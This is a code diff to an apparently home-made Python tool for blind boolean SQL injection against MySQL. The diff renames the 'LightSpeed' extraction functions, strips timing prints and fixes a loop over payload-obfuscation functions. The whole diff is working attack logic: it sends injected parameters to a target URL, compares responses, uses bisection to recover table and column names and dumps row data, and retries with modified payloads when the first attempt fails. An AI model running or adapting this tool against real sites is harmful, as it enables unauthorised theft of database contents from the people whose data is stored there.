@@ -857,7 +857,6 @@ def extractBooleanInfo(url, params, vulnPoint, payloads, t, f, row, extract, tbl
 
         while low <= high:
             mid = low + (high - low) // 2
-            print (f"Low: {low} | MID: {mid} | High: {high}")
             newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, op, mid, tblName=tblName, clmName=clmName)
             if boolenTF(url, newParams, t, f):
                 low = mid + 1
@@ -960,7 +959,7 @@ def extractBooleanMain(url, params, vulnPoint, payloads, trueFalsePayloads, tbl=
         return False, info
 
 # Optimised SQL-ANDing extraction method
-def prepPayload(params, vulnPoint, payloads, row, extract, pos, tblName=None, clmName=None):
+def prepPayloadLightSpeed(params, vulnPoint, payloads, row, extract, pos, tblName=None, clmName=None):
     if extract == "tbls":
         injPayload = payloads.format(pos=pos, row=row)
     elif extract == "clms":
@@ -971,13 +970,13 @@ def prepPayload(params, vulnPoint, payloads, row, extract, pos, tblName=None, cl
     newParams[vulnPoint] = injPayload
     return newParams
 
-def extractBooleanInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract, tblName=None, clmName=None, max_length=100):
+def extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract, tblName=None, clmName=None, max_length=100):
     x = ''
     pos = 1
 
     def getCharacters(payload, t0, t1, t2, t3, t4, t5, t6, t7):
         temp = ''
-        newParams = prepPayload(params, vulnPoint, payload, row, extract, pos, tblName=tblName, clmName=clmName)
+        newParams = prepPayloadLightSpeed(params, vulnPoint, payload, row, extract, pos, tblName=tblName, clmName=clmName)
         r = sendGetQ(url, params=newParams, allow_redirects=False)
         zV = 2 if payload == payload3 else 3
         if r.text == t0.text:
@@ -1014,11 +1013,11 @@ def extractBooleanInfo(url, params, vulnPoint, payload1, payload2, payload3, t0,
             pos += 1
     return x
 
-def extractTables(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7):
+def extractTablesLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7):
     row = 0
     tblNames = []
     while True:
-        tempTbl = extractBooleanInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract='tbls')
+        tempTbl = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract='tbls')
         if tempTbl:
             print ()
             tblNames.append(tempTbl)
@@ -1027,13 +1026,13 @@ def extractTables(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, 
             break
     return tblNames
 
-def extractColumns(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, tblNames):
+def extractColumnsLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, tblNames):
     clmNames = {}
     for tblName in tblNames:
         row = 0
         clmNames[tblName] = []
         while True:
-            tempClm = extractBooleanInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract='clms', tblName=tblName)
+            tempClm = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract='clms', tblName=tblName)
             if tempClm:
                 print ()
                 clmNames[tblName].append(tempClm)
@@ -1042,7 +1041,7 @@ def extractColumns(url, params, vulnPoint, payload1, payload2, payload3, t0, t1,
                 break
     return clmNames
     
-def extractInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, tblNames, clmNames):
+def extractInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, tblNames, clmNames):
     info = {}
     for tblName in tblNames:
         row = 0
@@ -1051,7 +1050,7 @@ def extractInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2
             tempDict = {}
             for clmName in clmNames[tblName]:
                 print ()
-                tempInfo = extractBooleanInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract='info', tblName=tblName, clmName=clmName)
+                tempInfo = extractBooleanInfoLightSpeed(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract='info', tblName=tblName, clmName=clmName)
                 tempDict[clmName] = tempInfo
             if not any(tempDict.values()):
                 break
@@ -1061,9 +1060,9 @@ def extractInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2
 
 def extractLightspeed(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, tbl=None, clm=None):
     info = {}
-    tblNames = [tbl] if tbl is not None else extractTables(url, params, vulnPoint, payload1[0], payload2[0], payload3[0], t0, t1, t2, t3, t4, t5, t6, t7)
-    clmNames = {tbl: clm} if clm is not None else extractColumns(url, params, vulnPoint, payload1[1], payload2[1], payload3[1], t0, t1, t2, t3, t4, t5, t6, t7, tblNames)
-    info.update(extractInfo(url, params, vulnPoint, payload1[2], payload2[2], payload3[2], t0, t1, t2, t3, t4, t5, t6, t7, tblNames, clmNames))
+    tblNames = [tbl] if tbl is not None else extractTablesLightSpeed(url, params, vulnPoint, payload1[0], payload2[0], payload3[0], t0, t1, t2, t3, t4, t5, t6, t7)
+    clmNames = {tbl: clm} if clm is not None else extractColumnsLightSpeed(url, params, vulnPoint, payload1[1], payload2[1], payload3[1], t0, t1, t2, t3, t4, t5, t6, t7, tblNames)
+    info.update(extractInfoLightSpeed(url, params, vulnPoint, payload1[2], payload2[2], payload3[2], t0, t1, t2, t3, t4, t5, t6, t7, tblNames, clmNames))
     
     if tbl is None and clm is None and info:
         return True, info
@@ -1145,7 +1144,6 @@ else:
             t5[specialParam] = 5
             t6[specialParam] = 6
             t7[specialParam] = 7
-            start = time.time()
             rT0 = sendGetQ(url, params=t0, allow_redirects=False)
             rT1 = sendGetQ(url, params=t1, allow_redirects=False)
             rT2 = sendGetQ(url, params=t2, allow_redirects=False)
@@ -1155,8 +1153,6 @@ else:
             rT6 = sendGetQ(url, params=t6, allow_redirects=False)
             rT7 = sendGetQ(url, params=t7, allow_redirects=False)
             r, info = extractLightspeed(baseURL, paramValues, specialParam, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, rT0, rT1, rT2, rT3, rT4, rT5, rT6, rT7, tbl=tbl, clm=clm)
-            end = time.time()
-            print (f"Time Speed: {end - start}")
             if r:
                 displayInfo(info)
             else:
@@ -1164,12 +1160,9 @@ else:
                 for func in modifyFunctions:
                     mFunc = globals()[func]
                     print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
-                    start = time.time()
                     r2, info = extractLightspeed(baseURL, paramValues, specialParam, mFunc(optimisedSQAndingPayload1), mFunc(optimisedSQAndingPayload2), mFunc(optimisedSQAndingPayload3), rT0, rT1, rT2, rT3, rT4, rT5, rT6, rT7, tbl=tbl, clm=clm)
-                    end = time.time()
                     if r2:
                         print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {specialParam} parameter" + Fore.RESET)
-                        print (f"Time Speed: {end - start}")
                         displayInfo(info)
                         success = True
                         break
@@ -1188,7 +1181,7 @@ else:
                 displayInfo(info)
             else:
                 success = False
-                for func in modifyFunctions.modifyFunctions:
+                for func in modifyFunctions:
                     mFunc = globals()[func]
                     print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
                     r, info = extractBooleanMain(baseURL, params, vulnPoint, mFunc(extractBP0), mFunc(trueFalsePayloads), tbl=tbl, clm=clm)
@@ -1203,17 +1196,14 @@ else:
                     print (Fore.RED + "[-] Count not dump database" + Fore.RESET)
         else:
             success = False
-            for func in modifyFunctions.modifyFunctions:
+            for func in modifyFunctions:
                 mFunc = globals()[func]
                 results, params, vulnPoint = identifyMySQLBoolean(baseURL, paramValues, mFunc(fuzzGenericPayloads), trueFalsePayloads)
                 print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
                 if results:
                     print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnPoint} parameter" + Fore.RESET)
                     print (Fore.YELLOW + f"[*] Dumping Database!" + Fore.RESET)
-                    start2 = time.time()
                     r, info = extractBooleanMain(url, params, vulnPoint, mFunc(extractBP0), mFunc(trueFalsePayloads), tbl=tbl, clm=clm)
-                    end2 = time.time()
-                    print (f"Time BiSection: {end2 - start2}")
                     if r:
                         displayInfo(info)
                         success = True
